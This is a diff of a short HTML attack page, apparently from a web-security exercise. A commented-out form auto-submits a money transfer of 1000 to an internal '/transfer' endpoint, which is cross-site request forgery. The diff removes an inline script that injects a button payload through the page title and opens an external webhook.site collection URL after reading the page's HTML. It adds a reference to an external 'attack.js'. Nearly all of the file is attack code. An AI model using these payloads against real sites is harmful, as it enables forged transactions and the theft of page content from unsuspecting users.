@@ -1,7 +1,10 @@
 <html>
-<title>
-    Hi
-</title>
+
+<head>
+    <title>Hi</title>
+    <script src="attack.js">
+    </script>
+</head>
 <!-- <body onload="document.forms[0].submit();">
     <form action="http://192.168.2.98:49698/transfer" method="POST">
         <input type="text" class="form-control" id="inputTo" name="user_to"
@@ -10,19 +13,6 @@
             value="1000">
     </form>
 </body> -->
-<script>
-    function changeTitle() {
-        var attackScript = "<button onload='sendHTML()'></button>"
-        if (document.title != attackScript) {
-            document.title = attackScript;
-        }
-    }
-
-    function sendHTML() {
-        var html = document.documentElement.outerHTML;
-        window.open('https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c');
-    }
-</script>
 
 <body onload="changeTitle()">
 </body>
